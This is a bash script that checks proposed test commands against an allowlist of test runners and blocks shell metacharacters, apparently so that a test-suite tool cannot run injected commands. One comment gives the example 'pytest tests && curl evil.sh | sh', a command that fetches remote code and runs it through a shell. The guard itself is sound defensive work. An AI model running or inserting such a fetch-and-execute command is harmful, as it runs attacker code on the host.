#!/usr/bin/env bash
# check-test-command.sh — allowlist guard for improving-test-suites validator.
# Usage: check-test-command.sh "<command string>"
# Exit 0 if the command matches a known test runner prefix; 1 otherwise; 64 usage.
set -euo pipefail

if [ "$#" -ne 1 ]; then
  printf '%s\n' "usage: $0 \"<command string>\"" >&2
  exit 64
fi

cmd="$1"
# Trim leading whitespace
cmd_trimmed="${cmd#"${cmd%%[![:space:]]*}"}"

# Reject shell metacharacters so an allowed runner prefix cannot smuggle a
# compound command (e.g. `pytest tests && curl evil.sh | sh`).
case "$cmd_trimmed" in
*';'* | *'&'* | *'|'* | *'`'* | *'$('* | *'>'* | *'<'* | *$'\n'*)
  printf '%s\n' "command contains shell metacharacters: $cmd_trimmed" >&2
  exit 1
  ;;
esac

case "$cmd_trimmed" in
pytest\ * | pytest | \
  python\ -m\ pytest\ * | python\ -m\ pytest | \
  go\ test\ * | go\ test | \
  npm\ test\ * | npm\ test | \
  yarn\ test\ * | yarn\ test | \
  pnpm\ test\ * | pnpm\ test | \
  npx\ vitest\ * | npx\ vitest | \
  npx\ jest\ * | npx\ jest | \
  cargo\ test\ * | cargo\ test | \
  mvn\ test\ * | mvn\ test | \
  ./gradlew\ test\ * | ./gradlew\ test | \
  rspec\ * | rspec | \
  mix\ test\ * | mix\ test)
  exit 0
  ;;
*)
  printf '%s\n' "command not on test-runner allowlist: $cmd_trimmed" >&2
  exit 1
  ;;
esac
